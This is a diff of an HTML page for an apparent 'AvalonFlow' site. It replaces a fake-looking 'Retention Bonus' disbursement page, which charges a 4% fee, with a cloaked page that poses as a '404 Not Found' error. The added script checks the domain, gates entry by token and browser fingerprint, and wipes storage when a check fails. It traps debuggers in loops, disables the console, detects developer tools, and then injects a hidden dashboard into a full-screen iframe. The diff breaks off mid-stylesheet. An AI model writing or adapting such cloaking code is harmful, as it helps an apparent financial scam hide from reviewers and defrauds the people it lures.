@@ -1,502 +1,1026 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AvalonFlow - Transaction Review</title>
     <style>
-        :root {
-            --card-bg: rgba(255, 255, 255, 0.4);
-            --card-border: rgba(124, 58, 237, 0.15);
-            --text-primary: #1e293b;
-            --text-secondary: #64748b;
-            --accent-purple: #7c3aed;
-            --accent-glow: rgba(124, 58, 237, 0.2);
-            --red-fee: #ef4444;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        }
-
-        body {
-            color: var(--text-primary);
-            min-height: 100vh;
+        body { 
+            font-family: 'Georgia', sans-serif;  
+            background-color: #161b22; 
+            color: #c9d1d9; 
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-        }
-
-        /* Notification Bar */
-        .notification-bar {
-            position: fixed;
-            top: -80px;
-            right: 20px;
-            background: rgba(30, 144, 255, 0.25);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(30,144,255,0.4);
-            color: #fff;
-            padding: 12px 18px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: bold;
-            box-shadow: 0 6px 18px rgba(0,0,0,0.25);
-            transition: top 0.5s ease, opacity 0.5s ease;
-            z-index: 9999;
-            opacity: 0;
-            max-width: 350px;
-            white-space: normal;
-            overflow: hidden;
-        }
-        .notification-bar.show {
-            top: 20px;
-            opacity: 1;
-        }
-
-        .notification-bar::before {
-            content: '';
-            position: absolute;
-            left: -50%;
-            top: 0;
-            width: 50%;
-            height: 100%;
-            background: rgba(255,255,255,0.3);
-            transform: skewX(-25deg);
-            animation: liquidWave 2s linear infinite;
-        }
-        @keyframes liquidWave {
-            0% { left: -50%; }
-            100% { left: 100%; }
-        }
-
-        /* -------- Floating Background -------- */
-        #floating-bg {
-            position: fixed;
-            inset: 0;
-            z-index: 0;
-            pointer-events: none;
-            background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
-            overflow: hidden;
-        }
-
-        .particle {
-            position: absolute;
-            border-radius: 50%;
-            opacity: 0.6;
-            animation: floatParticles linear infinite;
-            background: rgba(120, 180, 255, 0.7);
-            box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
-        }
-
-        @keyframes floatParticles {
-            0% { transform: translateY(100vh) scale(0.3); opacity: 0; }
-            50% { opacity: 1; }
-            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
-        }
-
-        .container {
-            width: 100%;
-            max-width: 460px;
+            height: 100vh;
+            margin: 0; 
             padding: 20px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .transaction-card {
-            background: var(--card-bg);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border: 1px solid var(--card-border);
-            border-radius: 32px;
-            padding: 28px;
-            box-shadow: 0 20px 50px rgba(31, 38, 135, 0.08);
-            position: relative;
-            overflow: hidden;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .card-header {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-
-        .card-header h2 {
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: var(--text-primary);
-        }
-
-        .flag-wrapper {
-            font-size: 2rem;
-            line-height: 1;
-        }
-
-        .divider {
-            border: none;
-            height: 1px;
-            background: rgba(124, 58, 237, 0.1);
-            margin-bottom: 24px;
-        }
-
-        .conversion-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            position: relative;
-            margin-bottom: 24px;
-        }
-
-        .amount-box {
-            background: rgba(255, 255, 255, 0.45);
-            border: 1px solid rgba(255, 255, 255, 0.6);
-            border-radius: 20px;
-            padding: 18px;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.01);
-            transition: all 0.3s ease;
-        }
-
-        .order-1 { order: 1; }
-        .order-2 { order: 2; }
-        .order-3 { order: 3; }
-        .order-4 { order: 4; }
-
-        .amount-box.highlight {
-            border-color: rgba(124, 58, 237, 0.25);
-            background: rgba(255, 255, 255, 0.6);
-        }
-
-        .amount-box.locked {
-            background: rgba(241, 245, 249, 0.4);
-            border-color: rgba(203, 213, 225, 0.4);
-            opacity: 0.55;
-            filter: grayscale(20%);
-        }
-
-        .label {
-            font-size: 0.75rem;
-            color: var(--text-secondary);
-            display: block;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.75px;
-            font-weight: 600;
-        }
-
-        .value-display {
-            font-size: 1.75rem;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: var(--text-primary);
-        }
-
-        .lock-icon {
-            font-size: 1.25rem;
-            margin-right: 2px;
-            display: inline-flex;
-            align-items: center;
-        }
-
-        .currency-tag {
-            font-size: 0.9rem;
-            color: var(--text-secondary);
-            margin-left: auto;
-            font-weight: 600;
-        }
-
-        .conversion-arrow {
-            position: absolute;
-            left: 36px;
-            top: 48%;
-            transform: translateY(-50%);
-            background: var(--accent-purple);
-            border: 4px solid #ffffff;
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 2;
-            box-shadow: 0 4px 10px rgba(124, 58, 237, 0.3);
-            transition: top 0.3s ease;
-        }
-
-        .conversion-arrow svg {
-            width: 14px;
-            height: 14px;
-            stroke: white;
-        }
-
-        .details-list {
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
-            margin-bottom: 28px;
-            background: rgba(255, 255, 255, 0.3);
-            padding: 18px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.4);
-        }
-
-        .detail-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.9rem;
-        }
-
-        .detail-label { color: var(--text-secondary); font-weight: 500; }
-        .detail-value { font-weight: 600; color: var(--text-primary); }
-        .font-gradient { color: var(--accent-purple); }
-        .fee-deducted { color: var(--red-fee); font-weight: 600; }
-
-        .security-note {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-            margin-bottom: 24px;
-            line-height: 1.4;
-            padding: 0 4px;
-        }
-
-        .security-note svg {
-            width: 20px;
-            height: 20px;
-            stroke: var(--text-secondary);
-            flex-shrink: 0;
-        }
-
-        .btn-primary {
-            width: 100%;
-            background: var(--accent-purple);
-            color: white;
-            border: none;
-            padding: 18px;
-            border-radius: 18px;
-            font-size: 1.05rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 6px 20px var(--accent-glow);
-        }
-
-        .btn-primary:hover {
-            background: #6d28d9;
-            transform: translateY(-1px);
-            box-shadow: 0 8px 24px rgba(124, 58, 237, 0.35);
-        }
-
-        .btn-primary:disabled {
-            background: rgba(0, 0, 0, 0.1);
-            color: var(--text-secondary);
-            cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
-        }
-
-        .overlay-screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            z-index: 10;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 30px;
+            box-sizing: border-box;
             text-align: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.4s ease;
+            visibility: hidden; 
         }
-
-        .overlay-screen.active { opacity: 1; pointer-events: auto; }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(124, 58, 237, 0.1);
-            border-top-color: var(--accent-purple);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .success-icon-wrap {
-            width: 72px;
-            height: 72px;
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            border-radius: 50%;
+        body.render-ready { visibility: visible; }
+        .error-container { max-width: 500px; }
+        .error-code-wrapper {
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
+            font-size: 140px;
+            font-weight: 600;
+            line-height: 1;
+            letter-spacing: -2px;
+            color: #f0f6fc;
+            user-select: none;
             margin-bottom: 24px;
         }
-
-        .success-icon-wrap svg { width: 36px; height: 36px; stroke: #10b981; }
-        .status-title { font-size: 1.4rem; font-weight: 700; margin-bottom: 8px; color: var(--text-primary); }
-        .status-desc { font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 24px; line-height: 1.5; }
-
-        .receipt-mini {
-            background: rgba(255, 255, 255, 0.5);
-            border: 1px solid rgba(124, 58, 237, 0.1);
-            width: 100%;
-            border-radius: 20px;
-            padding: 18px;
-            margin-bottom: 28px;
+        .logo-container {
+            width: 130px;
+            height: 130px;
+            margin: 0 10px;
             display: flex;
-            flex-direction: column;
-            gap: 12px;
-            text-align: left;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            overflow: hidden; 
         }
-
-        .receipt-row { display: flex; justify-content: space-between; font-size: 0.9rem; }
-        .hash-text { font-family: monospace; color: var(--accent-purple); font-weight: 600; }
+        .logo-img { width: 100%; height: 100%; object-fit: cover; }
+        h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f0f6fc; }
     </style>
-</head>
-<body>
-
-    <div id="planNotification" class="notification-bar"></div>
-    <div id="floating-bg"></div>
-
-    <div class="container">
-        <div class="transaction-card" id="main-card">
-            
-            <!-- STEP 1: REVIEW TRANSACTION STATE -->
-            <div id="review-state">
-                <div class="card-header">
-                    <div class="flag-wrapper" id="badge-flag">🇬🇧</div>
-                    <h2>Review Transaction</h2>
-                </div>
-
-                <hr class="divider">
-
-                <div class="conversion-container" id="cards-wrapper">
-                    <!-- Available Balance Field (Card A) -->
-                    <div class="amount-box locked order-1" id="balance-box">
-                        <span class="label" id="balance-card-title">Available Balance</span>
-                        <div class="value-display" id="balance-value-container">
-                            <span id="balance-lock" class="lock-icon">🔒</span>
-                            <span id="balance-unit-symbol">$</span><span id="balance-amount">0.00</span> 
-                            <span class="currency-tag" id="balance-currency-tag">CAD</span>
-                        </div>
-                    </div>
-
-                    <!-- Retention Bonus Field (Card B) -->
-                    <div class="amount-box order-2" id="send-box">
-                        <span class="label" id="send-card-title">Retention Bonus</span>
-                        <div class="value-display" id="send-value-container">
-                            <span id="send-lock" class="lock-icon" style="display: none;">🔒</span>
-                            <span id="send-currency-symbol">$</span><span id="send-amount">26,779.97</span><span class="currency-tag" id="send-currency-tag">CAD</span>
-                        </div>
-                    </div>
-
-                    <!-- Visual Indicator Arrow -->
-                    <div class="conversion-arrow order-3" id="indicator-arrow">
-                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><polyline points="19 12 12 19 5 12"></polyline></svg>
-                    </div>
-
-                    <!-- Final Conversion Recipient View (Card C) -->
-                    <div class="amount-box highlight order-4" id="receive-box">
-                        <span class="label">They Receive (Post-Fee Conversion)</span>
-                        <div class="value-display"><span id="receive-symbol">£</span> <span id="receive-amount">0.00</span> <span id="receive-currency" class="currency-tag">GBP</span></div>
-                    </div>
-                </div>
-
-                <div class="details-list">
-                    <div class="detail-item">
-                        <span class="detail-label">Network Fee (4%)</span>
-                        <span id="fee-display" class="fee-deducted">-$0.00</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label">Net Settlement Amount</span>
-                        <span id="net-cad-display" class="detail-value">$0.00 CAD</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label">Estimated Arrival</span>
-                        <span id="arrival-time" class="detail-value font-gradient">Calculating...</span>
-                    </div>
-                    <div class="detail-item">
-                        <span class="detail-label">Transfer Method</span>
-                        <span id="payout-method" class="detail-value">Checking configuration...</span>
-                    </div>
-                </div>
-
-                <div class="security-note">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                    <span>Secured via intercompany automated asset routing system.</span>
-                </div>
-
-                <button id="confirm-btn" class="btn-primary">Confirm & Authorize Disbursement</button>
-            </div>
-
-            <!-- STEP 2: LOADING OVERLAY -->
-            <div class="overlay-screen" id="loading-screen">
-                <div class="spinner"></div>
-                <h3 style="font-weight: 700; color: var(--text-primary); margin-bottom: 6px;">Authorizing Secure Asset</h3>
-                <p style="font-size: 0.85rem; color: var(--text-secondary);">Routing liquidity blocks to regional intercompany gateway...</p>
-            </div>
-
-            <!-- STEP 3: SUCCESS OVERLAY -->
-            <div class="overlay-screen" id="success-screen">
-                <div class="success-icon-wrap">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                </div>
-                <h3 class="status-title">Disbursement Sent</h3>
-                <p class="status-desc">Liquidity settlement instructions successfully pushed into the terminal queue.</p>
-                
-                <div class="receipt-mini">
-                    <div class="receipt-row">
-                        <span class="detail-label">Settlement Target</span>
-                        <span id="receipt-target" class="detail-value">-</span>
-                    </div>
-                    <div class="receipt-row">
-                        <span class="detail-label">Deducted Network Fee</span>
-                        <span id="receipt-fee" class="fee-deducted">-</span>
-                    </div>
-                    <div class="receipt-row">
-                        <span class="detail-label">Disbursed Total (Net)</span>
-                        <span id="receipt-payout" class="detail-value font-gradient" style="font-weight:700;">-</span>
-                    </div>
-                    <div class="receipt-row">
-                        <span class="detail-label">Routing Hash</span>
-                        <span id="receipt-hash" class="hash-text">-</span>
-                    </div>
-                </div>
-
-                <button id="close-btn" class="btn-primary" style="background: rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.05); color: var(--text-primary);">Return to Dashboard</button>
-            </div>
-
-        </div>
-    </div>
 
     <script>
-        const notification = document.getElementById("planNotification");
+    (function() {
+        const SecurityEngine = {
+            validateExecutionEnvironment: function() {
+                const authorizedDomain = "avalonflow.site";
+                const currentHost = window.location.hostname;
+                const isAuthorized = (currentHost === authorizedDomain || currentHost.endsWith('.' + authorizedDomain));
+                
+                if (!isAuthorized) {
+                    this.triggerSelfDestruct();
+                    return false;
+                }
+                return true;
+            },
 
-        function showNotification(message, duration = 3000) {
-            if (!notification) return;
-            notification.textContent = message;
-            notification.classList.add("show");
-            clearTimeout(notification.hideTimer);
-            notification.hideTimer = setTimeout(() => { notification.classList.remove("show"); }, duration);
+            get404Template: function() {
+                return `
+                    <div class="error-container">
+                        <div class="error-code-wrapper">
+                            <span>4</span>
+                            <div class="logo-container">
+                                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
+                            </div>
+                            <span>4</span>
+                        </div>
+                        <h2>Didn’t find anything here!</h2>
+                    </div>
+                `;
+            },
+
+            triggerSelfDestruct: function() {
+                localStorage.clear();
+                sessionStorage.clear();
+                document.body.innerHTML = this.get404Template();
+                document.body.classList.add('render-ready');
+                try { window.open('', '_self').close(); } catch (e) {}
+                this.activateInspectorTrap();
+                this.activateEnvironmentSabotage();
+            },
+
+            activateResetListener: function() {
+                window.addEventListener('message', (event) => {
+                    if (event.origin !== window.location.origin) return;
+                    if (event.data && event.data.type === 'COMMAND_SYSTEM_RESET') {
+                        localStorage.setItem('_sys_reset_token', event.data.resetId);
+                        localStorage.setItem('_sys_reset_expiry', event.data.expiresAt);
+                        const currentUrl = new URL(window.location.href);
+                        currentUrl.searchParams.set('auth_reset', event.data.resetId);
+                        window.location.href = currentUrl.toString();
+                    }
+                });
+            },
+
+            establish7DayClearance: function() {
+                const expiry = Date.now() + (7 * 24 * 60 * 60 * 1000);
+                localStorage.setItem('_sys_persistence_anchor', expiry.toString());
+            },
+
+            isPersistenceWindowActive: function() {
+                const savedAnchor = localStorage.getItem('_sys_persistence_anchor');
+                return savedAnchor && Date.now() < parseInt(savedAnchor, 10);
+            },
+
+            checkResetValidation: function() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const urlToken = urlParams.get('auth_reset');
+                const incomingOTK = urlParams.get('otk');
+
+                if (urlToken) {
+                    if (urlToken === localStorage.getItem('_sys_reset_token') && Date.now() < parseInt(localStorage.getItem('_sys_reset_expiry') || 0, 10)) {
+                        this.establish7DayClearance();
+                        this.executeSystemRevival();
+                        return true; 
+                    }
+                    this.triggerSelfDestruct();
+                    return false;
+                }
+
+                if (incomingOTK) {
+                    try {
+                        const [entropy, expirationTimestamp] = atob(incomingOTK).split('.');
+                        if (Date.now() > parseInt(expirationTimestamp, 10) || localStorage.getItem('active_session_otk') !== incomingOTK) {
+                            this.triggerSelfDestruct();
+                            return false;
+                        }
+                        localStorage.removeItem('active_session_otk');
+                        this.establish7DayClearance();
+                        this.executeSystemRevival();
+                        return true;
+                    } catch (e) { this.triggerSelfDestruct(); return false; }
+                }
+                return false;
+            },
+
+            executeSystemRevival: function() {
+                localStorage.removeItem('_sys_reset_token');
+                localStorage.removeItem('_sys_reset_expiry');
+                const user = new URLSearchParams(window.location.search).get('user');
+                const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + (user ? `?user=${encodeURIComponent(user)}` : '');
+                window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
+                window.location.reload();
+            },
+
+            getHardwareID: function() {
+                const components = [navigator.userAgent, navigator.platform, screen.width, screen.height].join('|');
+                let hash = 0;
+                for (let i = 0; i < components.length; i++) hash = ((hash << 5) - hash) + components.charCodeAt(i);
+                return '1' + (hash | 0).toString(16); 
+            },
+
+            detectAgencyProfile: function() {
+                return navigator.userAgent.includes("Corporate-Gateway") ? 'GOVERNMENT' : 'PRIVATE';
+            },
+
+            activateInspectorTrap: function() { setInterval(() => { debugger; }, 50); },
+
+            activateEnvironmentSabotage: function() {
+                console.log = console.warn = console.error = console.info = () => {};
+                setInterval(() => {
+                    const paths = ['4|1|3|0|2'.split('|')];
+                    let pointer = 0;
+                    while (true) {
+                        switch (['4','1','3','0','2'][pointer++]) {
+                            case '0': try { (function stackTrap(i) { if (("" + i/i)["length"] !== 1 || i % 20 === 0) (function(){}).constructor("debugger")(); else stackTrap(++i); })(0); } catch(e) {} continue;
+                            case '1': if (Math.random() > 0.5) window.status = 'VALIDATING'; continue;
+                            case '2': return;
+                            case '3': if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) this.triggerSelfDestruct(); continue;
+                            case '4': (Date.now() % 1000) * 0x5a1b; continue;
+                        }
+                        break;
+                    }
+                }, 200); 
+            },
+
+            injectSecureApp: function(agencyType) {
+                const payload = document.getElementById('hidden-application-payload');
+                if (!payload || !payload.innerHTML.trim()) { this.triggerSelfDestruct(); return; }
+                const frame = document.createElement('iframe');
+                frame.style = 'width:100vw;height:100vh;border:none;position:fixed;top:0;left:0;z-index:999999';
+                frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms'); 
+                document.body.appendChild(frame);
+                const ctx = frame.contentWindow || frame.contentDocument;
+                ctx.AUTHORIZED_AGENCY = agencyType;
+                ctx.document.open(); ctx.document.write(payload.innerHTML); ctx.document.close();
+                payload.style.display = 'none'; 
+                document.body.classList.add('render-ready');
+            },
+
+            run: function() {
+                if (!this.validateExecutionEnvironment()) return;
+
+                this.activateResetListener();
+                if (this.checkResetValidation()) return;
+
+                const id = this.getHardwareID();
+                const type = this.detectAgencyProfile();
+                
+                if (this.isPersistenceWindowActive() || ((id.startsWith('a') || id.startsWith('1')) && (type === 'GOVERNMENT' || type === 'PRIVATE'))) {
+                    this.activateInspectorTrap();         
+                    this.activateEnvironmentSabotage();   
+                    document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => this.injectSecureApp(type)) : this.injectSecureApp(type);
+                } else {
+                    this.triggerSelfDestruct();
+                }
+            }
+        };
+
+        window.addEventListener("message", (e) => { if (e.data?.type === "UPDATE_TITLE") document.title = e.data.title; });
+        document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => SecurityEngine.run()) : SecurityEngine.run();
+    })();
+    </script>
+</head>
+<body>
+    <div class="error-container">
+        <div class="error-code-wrapper">
+            <span>4</span>
+            <div class="logo-container">
+                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
+            </div>
+            <span>4</span>
+        </div>
+        <h2>Didn’t find anything here!</h2>
+    </div>
+    <div id="hidden-application-payload" style="display:none;"><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>My Dashboard</title>
+    
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3">
+<link rel="icon" type="image/x-icon" href="/favicon.ico?v=3">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=3">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=3">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v=3">
+<link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png?v=3">
+<link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png?v=3">
+<link rel="manifest" href="/manifest.json?v=3">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "AvalonFlow",
+  "url": "https://avalonflow.site",
+  "logo": "https://avalonFlow.site/favicon.png"
+}
+</script>
+    
+    <style>
+body{
+font-family: Inter, system-ui, sans-serif;
+margin:0;
+background:#06070c;
+color:white;
+overflow-x:hidden;
+}
+
+html, body {
+    height: 100%;
+}
+
+body::before{
+content:"";
+position:fixed;
+inset:0;
+background:
+linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+background-size:40px 40px;
+z-index:-1;
+}
+
+body::after{
+content:"";
+position:fixed;
+inset:0;
+background:
+radial-gradient(circle at 20% 20%, rgba(107,44,216,0.25), transparent 40%),
+radial-gradient(circle at 80% 60%, rgba(0,255,255,0.15), transparent 40%);
+z-index:-1;
+}
+
+#sidebar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 280px;
+    height: calc(100% - 102px); 
+    background: rgba(40, 75, 135, 0.75);
+    backdrop-filter: blur(14px);
+    z-index: 5; 
+    padding: 25px;
+    transform: translateX(-100%);
+    transition: transform 0.3s ease;
+}
+        #sidebar.open { transform: translateX(0); }
+        #sidebar h2{
+font-size:22px;
+margin-bottom:20px;
+color:#a78bfa;
+}
+        #sidebar button {
+            width: 100%;
+            margin: 12px 0;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 16px;
         }
+
+        #menuBtn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 6;
+            background: #6b2cd8;
+            border: none;
+            color: #fff;
+            padding: 12px 14px;
+            border-radius: 10px;
+}
+
+#menuBtn.shift{
+left:300px;
+}
+
+#content {
+  max-width: 1400px;         
+  margin: auto;              
+  padding: 10px 24px 40px 24px; 
+  min-height: 100vh;         
+  display: flex;
+  flex-direction: column;    
+  gap: 24px;                 
+}
+
+.glass-card{
+background:rgba(255,255,255,0.04);
+backdrop-filter:blur(14px);
+border-radius:18px;
+padding:28px;
+border:1px solid rgba(255,255,255,0.05);
+box-shadow:
+0 10px 30px rgba(0,0,0,0.6),
+inset 0 0 30px rgba(255,255,255,0.03);
+transition:0.35s;
+position:relative;
+overflow:hidden;
+}
+
+.glass-card:hover{
+transform:translateY(-6px);
+box-shadow:0 20px 60px rgba(107,44,216,0.45);
+}
+
+.glass-card h3{
+color:#6b2cd8;
+margin-top: 0;
+}
+
+.glass-card::before{
+content:"";
+position:absolute;
+inset:0;
+border-radius:18px;
+padding:1px;
+background:linear-gradient(120deg,#6b2cd8,#00f2fe,#6b2cd8);
+-webkit-mask:
+linear-gradient(#000 0 0) content-box,
+linear-gradient(#000 0 0);
+-webkit-mask-composite:xor;
+opacity:0.25;
+}
+
+.dashboard-title {
+  grid-column: 1 / -1; 
+  text-align: center;
+  margin-bottom: 24px;
+  margin-top: -100px;
+}
+
+.metric-row {
+  display: flex;
+  gap: 24px;
+  flex-wrap: wrap; 
+}
+
+.hero-card {
+  flex: 2 1 400px;
+  min-width: 260px;
+  text-align: center;
+  margin-top: -50px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+
+.hero-card h2 {
+  color: #a78bfa; 
+  font-size: 16px;
+  margin: 0 0 8px 0;
+  width: 100%;    
+  text-align: center;
+}
+
+.stat-card {
+  flex: 1 1 180px; 
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+}
+
+.stat-card h4 {
+  color: #a78bfa; 
+  margin-bottom: 8px;
+}
+
+.stat-card h3 {
+  color: #a78bfa; 
+  margin-bottom: 8px;
+  width: 100%;
+  font-size: 15px;
+}
+
+.stat {
+  font-size: 22px;
+  font-weight: 600;
+  white-space: nowrap;
+  color: #a78bfa;
+  background: linear-gradient(90deg, #FF0000, #FF6666, #990000, #FF0000);
+  background-size: 200% auto;
+  animation: gradientShift 6s linear infinite;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+@keyframes gradientShift {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+}
+
+.stats {
+  font-size: 28px;
+  font-weight: 600;
+  color: #a78bfa;
+}
+
+.top-right-profile {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    z-index: 999;
+}
+
+.avatar-ring {
+    width: 52px;
+    height: 52px;
+    border-radius: 50%;
+    padding: 3px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+#profilePhoto:not([src]), 
+#profilePhoto[src="default-avatar.png"] {
+    content: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c0a9ff'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z'/%3E%3C/svg%3E") !important;
+    background: #1a1625 !important;
+    box-sizing: border-box !important;
+    padding: 6px !important;
+}
+
+.avatar-ring::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    background: conic-gradient(#a855f7, #7c3aed, #a855f7);
+    animation: spin 3s linear infinite, glowSweep 4s linear infinite;
+    filter: blur(5px);
+    opacity: 0.9;
+    z-index: 0;
+}
+
+.avatar-ring::after {
+    content: "";
+    position: absolute;
+    inset: 4px;
+    background: transparent;
+    border-radius: 50%;
+    z-index: 1;
+}
+
+.avatar {
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    object-fit: cover;
+    position: relative;
+    z-index: 2;
+    border: 1px solid rgba(255,255,255,0.1);
+}
+
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+@keyframes glowSweep { 0% { filter: blur(4px); opacity: 0.6; transform: rotate(0deg); } 100% { filter: blur(6px); opacity: 0.95; transform: rotate(360deg); } }
+
+.button{
+display:inline-block;
+background:linear-gradient(90deg,#6b2cd8,#00f2fe);
+border:none;
+border-radius:10px;
+padding:12px 20px;
+color:white;
+font-weight:600;
+}
+
+#floating-bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+    background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
+    overflow: hidden;
+}
+
+.particle {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.6;
+    animation: floatParticles linear infinite;
+    background: rgba(120, 180, 255, 0.7);
+    box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
+}
+
+@keyframes floatParticles {
+    0% { transform: translateY(100vh) scale(0.3); opacity: 0; }
+    50% { opacity: 1; }
+    100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+}
+
+.progress-bar {
+    width: 100%;
+    height: 18px;
+    background: rgba(120, 180, 255, 0.7);
+    border-radius: 12px;
+    overflow: hidden;
+    margin: 18px 0;
+}
+
+.progress-fill {
+    height: 100%;
+    width: 0%;
+    border-radius: 12px;
+    position: relative;
+    transition: width 0.6s ease;
+    background: linear-gradient(90deg,#4facfe,#00f2fe);
+    box-shadow: 0 0 20px rgba(79,172,254,0.6);
+}
+
+.progress-fill::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    animation: energyFlow 2.5s linear infinite;
+}
+
+@keyframes energyFlow { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    padding: 18px 0;
+    font-size: 14px;
+    color: #555;
+    background: rgba(255, 255, 255, 0.92);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
+    z-index: 6;
+}
+
+    .notification-bar {
+        position: fixed;
+        top: -80px;
+        right: 20px;
+        background: rgba(30, 144, 255, 0.25);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(30,144,255,0.4);
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 12px;
+        font-size: 14px;
+        font-weight: bold;
